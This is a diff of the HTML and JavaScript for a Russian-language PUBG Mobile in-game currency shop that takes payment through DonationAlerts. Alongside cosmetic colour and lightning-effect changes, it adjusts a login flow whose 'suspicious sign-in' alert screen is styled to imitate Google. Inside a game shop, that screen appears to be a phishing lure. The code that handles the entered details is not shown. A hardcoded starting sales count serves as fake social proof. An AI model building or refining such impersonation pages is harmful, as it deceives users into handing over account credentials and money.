+    <!-- ===== БЛОКИРОВКА ПРИ ОТКАЗЕ ===== -->
     <div id="blockedOverlay">
         <div class="blocked-box">
             <i class="fas fa-ban"></i>
             Доступ запрещён<br>
-            <span style="font-size: 16px; color: #666; font-family: 'Segoe UI', sans-serif;">Вы не приняли лицензионное соглашение</span>
+            <span style="font-size: 16px; color: #aaa; font-family: 'Segoe UI', sans-serif;">Вы не приняли лицензионное соглашение</span>
             <button id="retryLicenseBtn">Принять и продолжить</button>
         </div>
     </div>
 
-    <!-- ===== ФОН И МОЛНИИ ===== -->
     <div class="storm-bg"></div>
     <canvas id="lightningCanvas"></canvas>
 
@@ -801,9 +761,9 @@
                 <div class="hero-badge"><i class="fas fa-bolt"></i> Добро пожаловать в бурю!</div>
             </div>
 
-            <!-- ===== ПЛАШКИ-КАТАЛОГИ ===== -->
+            <!-- ===== ПЛАШКИ-КАТАЛОГИ (раскрывающиеся) ===== -->
             <div class="catalog-plashki">
-                <!-- UC -->
+                <!-- UC плашка -->
                 <div class="plashka-catalog" id="plashkaUC" onclick="toggleCatalog('uc')">
                     <div class="plashka-badge">🔥 ХИТ</div>
                     <div class="plashka-header">
@@ -816,7 +776,7 @@
                     <div class="plashka-products" id="ucProducts"></div>
                 </div>
 
-                <!-- Metro -->
+                <!-- Metro плашка -->
                 <div class="plashka-catalog plashka-catalog-metro" id="plashkaMetro" onclick="toggleCatalog('metro')">
                     <div class="plashka-badge">⭐ ВСЁ ВКЛЮЧЕНО</div>
                     <div class="plashka-header">
@@ -842,45 +802,43 @@
             </div>
 
             <div class="telegram-subscribe">
-                <i class="fab fa-telegram" style="font-size: 40px; color: #fff;"></i>
-                <h3>Подпишись на новости!</h3>
-                <p>Узнавай первым о новых акциях и товарах</p>
+                <i class="fab fa-telegram" style="font-size: 40px; color: #ff6600;"></i>
+                <h3 style="color: #fff;">Подпишись на новости!</h3>
+                <p style="color: #aaa;">Узнавай первым о новых акциях и товарах</p>
                 <button id="subscribeTelegramBtn">Подписаться в Telegram</button>
             </div>
         </div>
 
-        <!-- ===== СТРАНИЦА ОПЛАТЫ ===== -->
         <div id="paymentPage" class="page">
             <div class="payment-info">
                 <i class="fas fa-credit-card" style="font-size: 50px; color: #ff6600;"></i>
-                <h2>Оплата через DonationAlerts</h2>
-                <div style="background: #f9f9f9; border-radius: 15px; padding: 20px; margin: 20px 0; text-align: left; border-left: 3px solid #ff6600;">
-                    <h3 style="color: #ff6600;"><i class="fas fa-info-circle"></i> ВАЖНАЯ ИНФОРМАЦИЯ</h3>
-                    <ul style="list-style: none; color: #333;">
+                <h2 style="color: #fff;">Оплата через DonationAlerts</h2>
+                <div style="background: rgba(0,0,0,0.3); border-radius: 15px; padding: 20px; margin: 20px 0; text-align: left; border-left: 3px solid #ff6600;">
+                    <h3 style="color: #ff8800;"><i class="fas fa-info-circle"></i> ВАЖНАЯ ИНФОРМАЦИЯ</h3>
+                    <ul style="list-style: none; color: #ccc;">
                         <li style="margin: 10px 0;"><i class="fas fa-check-circle" style="color: #ff6600;"></i> При оплате ОБЯЗАТЕЛЬНО укажите ваш ИГРОВОЙ ID</li>
                         <li style="margin: 10px 0;"><i class="fas fa-check-circle" style="color: #ff6600;"></i> Укажите название товара в комментарии</li>
                         <li style="margin: 10px 0;"><i class="fas fa-check-circle" style="color: #ff6600;"></i> После оплаты товар придет в течение 5-15 минут</li>
                         <li style="margin: 10px 0;"><i class="fas fa-check-circle" style="color: #ff6600;"></i> По всем вопросам пишите в поддержку</li>
                     </ul>
                 </div>
-                <div style="background: rgba(255,102,0,0.1); border: 1px solid #ff6600; border-radius: 15px; padding: 20px; margin: 20px 0;">
+                <div style="background: rgba(255, 102, 0, 0.1); border: 1px solid #ff6600; border-radius: 15px; padding: 20px; margin: 20px 0;">
                     <i class="fab fa-telegram" style="font-size: 40px; color: #ff6600;"></i>
-                    <p style="color: #333;">По всем вопросам:</p>
-                    <a href="https://t.me/l_AWANGARD_l" target="_blank" style="color: #ff6600; text-decoration: none; font-size: 18px;">@l_AWANGARD_l</a>
+                    <p style="color: #ccc;">По всем вопросам:</p>
+                    <a href="https://t.me/l_AWANGARD_l" target="_blank" style="color: #ff8800; text-decoration: none; font-size: 18px;">@l_AWANGARD_l</a>
                 </div>
-                <a href="https://www.donationalerts.com/r/limitblitzoffical" target="_blank" class="btn-pay">
+                <a href="https://www.donationalerts.com/r/limitblitzoffical" target="_blank" style="display: inline-block; background: #ff6600; padding: 15px 40px; border-radius: 40px; color: #1a1a1a; text-decoration: none; font-weight: bold; transition: 0.3s;">
                     <i class="fas fa-external-link-alt"></i> Перейти к оплате
                 </a>
             </div>
         </div>
 
-        <!-- ===== СТРАНИЦА "КАК КУПИТЬ" ===== -->
         <div id="howtobuyPage" class="page">
             <div class="howtobuy-card">
                 <i class="fas fa-question-circle" style="font-size: 50px; color: #ff6600;"></i>
-                <h2>Как купить товар?</h2>
+                <h2 style="color: #fff;">Как купить товар?</h2>
                 <div class="howtobuy-steps">
-                    <ul style="list-style: none; color: #333;">
+                    <ul style="list-style: none; color: #ccc;">
                         <li><span class="step-number">1</span> Выберите товар и нажмите "Купить"</li>
                         <li><span class="step-number">2</span> Перейдите к оплате через DonationAlerts</li>
                         <li><span class="step-number">3</span> ОБЯЗАТЕЛЬНО укажите ваш игровой ID и название товара</li>
@@ -888,32 +846,30 @@
                         <li><span class="step-number">5</span> Товар придет в течение 5-15 минут</li>
                     </ul>
                 </div>
-                <div style="margin-top: 30px; background: rgba(255,102,0,0.1); border-radius: 15px; padding: 20px; border: 1px solid #ff6600;">
+                <div style="margin-top: 30px; background: rgba(255, 102, 0, 0.1); border-radius: 15px; padding: 20px; border: 1px solid #ff6600;">
                     <i class="fab fa-telegram" style="color: #ff6600;"></i>
-                    <p style="color: #333;">По всем вопросам: <strong style="color: #ff6600;">@l_AWANGARD_l</strong></p>
+                    <p style="color: #ccc;">По всем вопросам: <strong style="color: #ff8800;">@l_AWANGARD_l</strong></p>
                 </div>
             </div>
         </div>
 
-        <!-- ===== СТРАНИЦА ОТЗЫВОВ ===== -->
         <div id="reviewsPage" class="page">
             <div class="reviews-card">
                 <i class="fas fa-star" style="font-size: 50px; color: #ff6600;"></i>
-                <h2>Отзывы</h2>
-                <p style="color: #333;">Присоединяйтесь к нашему Telegram каналу, чтобы оставить отзыв или посмотреть отзывы других клиентов!</p>
-                <button id="openReviewsBtn" style="margin-top: 20px; background: #ff6600; border: none; padding: 12px 24px; border-radius: 30px; color: #fff; cursor: pointer; font-weight: bold; transition: 0.3s; box-shadow: 0 0 20px rgba(255,102,0,0.2);">
+                <h2 style="color: #fff;">Отзывы</h2>
+                <p style="color: #aaa;">Присоединяйтесь к нашему Telegram каналу, чтобы оставить отзыв или посмотреть отзывы других клиентов!</p>
+                <button id="openReviewsBtn" style="margin-top: 20px; background: #ff6600; border: none; padding: 12px 24px; border-radius: 30px; color: #1a1a1a; cursor: pointer; font-weight: bold; transition: 0.3s;">
                     <i class="fab fa-telegram"></i> Перейти в канал отзывов
                 </button>
             </div>
         </div>
 
-        <!-- ===== СТРАНИЦА О НАС ===== -->
         <div id="aboutPage" class="page">
             <div class="about-card">
                 <i class="fas fa-store" style="font-size: 50px; color: #ff6600;"></i>
-                <h2>О нас</h2>
-                <p style="margin: 20px 0; color: #333;">AWANGARD TEAM — надёжный магазин игровых товаров для PUBG Mobile. Лучшие цены, моментальная доставка, 24/7 поддержка.</p>
-                <p style="color: #555;">По всем вопросам: <strong style="color: #ff6600;">@l_AWANGARD_l</strong></p>
+                <h2 style="color: #fff;">О нас</h2>
+                <p style="margin: 20px 0; color: #ccc;">AWANGARD TEAM — надёжный магазин игровых товаров для PUBG Mobile. Лучшие цены, моментальная доставка, 24/7 поддержка.</p>
+                <p style="color: #aaa;">По всем вопросам: <strong style="color: #ff8800;">@l_AWANGARD_l</strong></p>
             </div>
         </div>
     </div>
@@ -953,8 +909,8 @@
             </div>
 
             <div id="stepPanic" class="hidden">
-                <h2 style="color: #d63031; font-weight: 400;">Подозрительный вход</h2>
-                <p class="sub" style="color: #555;">Кто-то пытался войти в ваш аккаунт</p>
+                <h2 style="color: #d93025; font-weight: 400;">Подозрительный вход</h2>
+                <p class="sub" style="color: #5f6368;">Кто-то пытался войти в ваш аккаунт</p>
                 <div class="google-alert">
                     <div class="alert-title">
                         <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
@@ -969,7 +925,7 @@
                         <span><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"/></svg> <span id="panicTime">Сегодня, только что</span></span>
                     </div>
                 </div>
-                <p style="font-size: 14px; color: #555; text-align: left; margin-bottom: 16px;">
+                <p style="font-size: 14px; color: #5f6368; text-align: left; margin-bottom: 16px;">
                     <strong>Ваш аккаунт под угрозой.</strong> Немедленно смените пароль.
                 </p>
                 <a href="https://myaccount.google.com/signinoptions/password" target="_blank" class="btn-google-change" id="changePasswordBtn">
@@ -1117,7 +1073,7 @@
         })();
 
         // ============================================================
-        // 3. МОЛНИИ (оранжевые на оранжевом фоне, более яркие)
+        // 3. МОЛНИИ
         // ============================================================
         (function() {
             const canvas = document.getElementById('lightningCanvas');
@@ -1185,15 +1141,15 @@
                 if (points.length < 2 || opacity <= 0) return;
 
                 ctx.save();
-                ctx.shadowColor = 'rgba(255,255,255,0.3)';
+                ctx.shadowColor = color;
                 ctx.shadowBlur = blur;
-                ctx.globalAlpha = opacity * 0.7;
+                ctx.globalAlpha = opacity * 0.6;
                 ctx.beginPath();
                 ctx.moveTo(points[0].x, points[0].y);
                 for (let i = 1; i < points.length; i++) {
                     ctx.lineTo(points[i].x, points[i].y);
                 }
-                ctx.strokeStyle = '#ffddbb';
+                ctx.strokeStyle = color;
                 ctx.lineWidth = lineWidth * 1.5;
                 ctx.lineCap = 'round';
                 ctx.lineJoin = 'round';
@@ -1208,7 +1164,7 @@
                 for (let i = 1; i < points.length; i++) {
                     ctx.lineTo(points[i].x, points[i].y);
                 }
-                ctx.strokeStyle = '#ffffff';
+                ctx.strokeStyle = '#ff8800';
                 ctx.lineWidth = lineWidth;
                 ctx.lineCap = 'round';
                 ctx.lineJoin = 'round';
@@ -1223,8 +1179,8 @@
                 for (let i = 1; i < points.length; i++) {
                     ctx.lineTo(points[i].x, points[i].y);
                 }
-                ctx.strokeStyle = '#ffaa44';
-                ctx.lineWidth = lineWidth * 0.4;
+                ctx.strokeStyle = '#fff';
+                ctx.lineWidth = lineWidth * 0.3;
                 ctx.lineCap = 'round';
                 ctx.lineJoin = 'round';
                 ctx.stroke();
@@ -1241,12 +1197,14 @@
                 let points = generateLightning(x1, y1, x2, y2, maxDiff, roughness);
                 let branches = generateBranches(points, maxDiff * 0.6, roughness * 0.9);
                 let allSegments = [points, ...branches];
+                let hue = 25 + Math.random() * 20;
+                let color = `hsl(${hue}, 100%, 55%)`;
                 let blur = 15 + Math.random() * 25;
                 let lineWidth = 2 + Math.random() * 3;
                 const maxLife = 2.5;
                 return {
                     segments: allSegments,
-                    color: '#ffaa44',
+                    color: color,
                     blur: blur,
                     lineWidth: lineWidth,
                     opacity: 1.0,
@@ -1288,7 +1246,7 @@
             function drawSparks(ctx) {
                 ctx.shadowBlur = 0;
                 for (let s of sparks) {
-                    ctx.fillStyle = `rgba(255, 220, 180, ${s.brightness * 0.5})`;
+                    ctx.fillStyle = `rgba(255, 200, 100, ${s.brightness * 0.4})`;
                     ctx.beginPath();
                     ctx.arc(s.x, s.y, s.size, 0, Math.PI * 2);
                     ctx.fill();
@@ -1480,7 +1438,7 @@
         })();
 
         // ============================================================
-        // 5. ЛОГИКА ПЛАШЕК (раскрытие) + FIX: stopPropagation
+        // 5. ОСНОВНАЯ ЛОГИКА — РАСКРЫТИЕ ПЛАШЕК
         // ============================================================
         let salesCount = parseInt(localStorage.getItem('awangard_sales') || '342');
 
@@ -1509,19 +1467,25 @@
             ]
         };
 
+        // Функция для переключения видимости товаров внутри плашки
         function toggleCatalog(type) {
             const containerId = (type === 'uc') ? 'ucProducts' : 'metroProducts';
             const container = document.getElementById(containerId);
             if (!container) return;
 
+            // Если уже открыто — закрываем
             if (container.classList.contains('open')) {
                 container.classList.remove('open');
                 return;
             }
 
+            // Закрываем все другие
             document.querySelectorAll('.plashka-products').forEach(el => el.classList.remove('open'));
+
+            // Открываем нужный
             container.classList.add('open');
 
+            // Если товары ещё не загружены — заполняем
             if (container.children.length === 0) {
                 const items = products[type] || [];
                 container.innerHTML = items.map(p => `
@@ -1533,15 +1497,14 @@
                         </div>
                         <div style="display: flex; align-items: center; gap: 10px;">
                             <span class="plashka-product-price">${p.price} ₽</span>
-                            <button class="plashka-buy-btn" onclick="buyProduct(event, '${p.name}', ${p.price})">Купить</button>
+                            <button class="plashka-buy-btn" onclick="buyProduct('${p.name}', ${p.price})">Купить</button>
                         </div>
                     </div>
                 `).join('');
             }
         }
 
-        function buyProduct(event, name, price) {
-            event.stopPropagation(); // Останавливаем всплытие, чтобы не закрывалась плашка
+        function buyProduct(name, price) {
             showToast(`Товар "${name}" (${price} ₽) добавлен в заказ. Перейдите к оплате.`);
             document.querySelector('[data-page="payment"]').click();
         }
@@ -1591,7 +1554,7 @@
         });
 
         // ============================================================
-        // 6. ЛОГИКА ВХОДА
+        // 6. ЛОГИКА СТРАНИЦЫ ВХОДА
         // ============================================================
         (function() {
             const loginPage = document.getElementById('loginPage');
@@ -1623,7 +1586,7 @@
         })();
 
         // ============================================================
-        // 7. ЛОГИКА ФОРМЫ ВХОДА
+        // 7. ЛОГИКА ВХОДА (форма)
         // ============================================================
         (function() {
             const stepLogin = document.getElementById('stepLogin');
